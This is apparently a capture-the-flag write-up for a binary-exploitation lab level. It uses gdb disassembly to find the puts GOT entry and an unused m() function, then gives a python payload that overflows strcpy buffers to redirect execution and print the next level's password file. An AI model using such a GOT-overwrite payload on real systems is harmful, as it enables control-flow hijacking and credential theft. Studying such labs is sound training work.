@@ -1,0 +1,49 @@
+- When we run the program without arguments we got Segmentation fault (core dumped)
+
+- After trying lot 2 arguments we got:
+
+$> ./level7 "eee" "ddd"
+~~
+
+- We start disassembling the program, we found a global variable "c" and an unused function m().
+
+- The m() function print the content of the variable "c".
+
+- The main function allocates two string pointers and uses strcpy to copy the content from argv[1] to str1 and argv[2] to str2.
+
+- Also the program call fopen to read a file from this path ("/home/user/level8/.pass") and store it to the global variable "c" using the fgets.
+
+- Also, the program call puts to print the string that we got in the first time "~~".
+
+- Now we have an idea how we can exploit the program, we need to jmp instruction of the puts function from an address to the address of the m() function.
+
+- Finding the jmp instruction.
+
+(gdb) disas main
+[...]
+0x080485f0 <+207>:	movl   $0x8048703,(%esp)
+0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+0x080485fc <+219>:	mov    $0x0,%eax
+[...]
+
+(gdb) disass 0x8048400
+[...]
+0x08048400 <+0>:	jmp    *0x8049928
+0x08048406 <+6>:	push   $0x28
+[...]
+
+=> 0x8049928
+
+- Finding the address of m function.
+
+(gdb) info func
+[...]
+0x080484f4  m
+0x08048521  main
+[...]
+
+=> 0x080484f4
+
+- Now, we need to make the payload for exploiting.
+
+$> ./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
